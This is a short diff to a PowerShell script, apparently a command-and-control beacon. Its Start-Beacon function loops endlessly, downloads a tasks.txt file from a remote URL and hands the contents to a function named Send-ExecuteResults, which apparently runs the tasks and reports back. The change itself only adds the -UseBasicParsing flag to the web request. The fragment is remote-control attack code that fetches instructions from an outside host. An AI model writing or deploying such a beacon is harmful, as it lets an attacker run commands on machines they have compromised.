@@ -29,7 +29,7 @@ function Start-Beacon {
 
     while ($true) {
         try {
-            $response = Invoke-WebRequest -Uri $($url + "/tasks.txt")
+            $response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing
             $tasks = $response.Content
             Write-Output "[$(Get-Date)] Tasks: `n$tasks"
             Send-ExecuteResults $tasks
